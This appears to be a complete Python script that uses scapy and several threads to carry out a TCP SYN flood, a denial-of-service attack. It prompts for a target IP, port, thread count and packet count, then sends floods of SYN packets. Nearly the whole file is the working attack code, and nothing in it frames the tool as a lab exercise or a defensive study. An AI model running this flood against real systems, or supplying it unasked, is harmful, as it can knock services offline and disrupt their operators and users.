import threading
import time
from scapy.all import IP, TCP, send

def syn_spammer(thread_id, ip, port, packets, delay):
    print(f"[Thread {thread_id}] Started...")

    for _ in range(packets):
        pkt = IP(dst=ip) / TCP(dport=port, flags="S")
        send(pkt, verbose=False)

        if delay > 0:
            time.sleep(delay)

    print(f"[Thread {thread_id}] Finished.")

def syn_flood(ip, port, threads, packets, delay):
    print("\nStarting SYN Flood...\n")
    print(f"Target: {ip}:{port}")
    print(f"Threads: {threads} | Packets per thread: {packets}\n\n")

    thread_list = []

    for t in range(threads):
        th = threading.Thread(target=syn_spammer, args=(t, ip, port, packets, delay))
        th.start()
        thread_list.append(th)

    for th in thread_list:
        th.join()

    print("\nSYN Flood Executed.")

def get_int(prompt, minimum=1):
    
    # Minimal numeric validation
    while True:
        try:
            val = int(input(prompt))
            if val >= minimum:
                return val
            
            print(f"Value must be >= {minimum}")

        except ValueError:
            print("Please enter a number.")


if __name__ == "__main__":
    
    try:
        ip = input("Target IP: ").strip()
        port = get_int("Target Port: ", 1)
        threads = get_int("Threads: ", 1)
        packets = get_int("Packets per thread: ", 1)
        delay = float(input("Delay (0 for none): ").strip() or 0)

        syn_flood(ip, port, threads, packets, delay)

    except KeyboardInterrupt:
        print("\n[!] Aborted by user.")
        exit(0)
